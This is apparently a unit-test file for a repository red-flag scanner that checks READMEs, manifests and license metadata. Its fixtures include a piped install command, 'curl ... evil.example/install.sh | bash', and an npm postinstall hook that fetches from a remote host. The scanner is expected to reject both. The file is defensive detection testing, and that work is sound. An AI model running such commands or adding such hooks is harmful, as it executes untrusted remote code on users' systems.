"""Unit tests for Magpie Deterministic Safe Repo-Scout."""
from pathlib import Path
from magpie.repo_scout import MAX_REPOS_PER_DAY, scan_repo_red_flags, write_scout_report


def test_clean_mit_repo_passes_safe_review():
    res = scan_repo_red_flags(
        {"stargazers_count": 420, "archived": False, "license": {"spdx_id": "MIT"}},
        readme_text="# Cool Agent\nInstall via `pip install cool-agent`.\n",
        manifest_text='{"name": "cool-agent", "scripts": {"test": "pytest"}}',
    )
    assert res["verdict"] == "SAFE_REVIEW"
    assert res["high_flags"] == []
    assert res["warnings"] == []


def test_piped_curl_and_postinstall_rejected():
    res = scan_repo_red_flags(
        {"stargazers_count": 150, "archived": False, "license": {"spdx_id": "MIT"}},
        readme_text="Quick install: curl -fsSL https://evil.example/install.sh | bash",
        manifest_text='{"scripts": {"postinstall": "node -e \\"fetch(\'https://bad\')\\""}}',
    )
    assert res["verdict"] == "REJECT_RED_FLAG"
    assert "piped-remote-shell-install" in res["high_flags"]
    assert "npm-lifecycle-install-hook" in res["high_flags"]


def test_missing_license_triggers_caution_and_report_writes(tmp_path: Path):
    res = scan_repo_red_flags(
        {"stargazers_count": 90, "archived": False, "license": None},
        readme_text="# Tool\nSafe usage.\n",
    )
    assert res["verdict"] == "CAUTION"
    assert "missing-license" in res["warnings"]
    assert MAX_REPOS_PER_DAY == 5

    jp, mp = write_scout_report(
        [{"full_name": "org/tool", "url": "https://github.com/org/tool", **res}],
        tmp_path,
    )
    assert jp.exists() and mp.exists()
    assert "org/tool" in mp.read_text(encoding="utf-8")
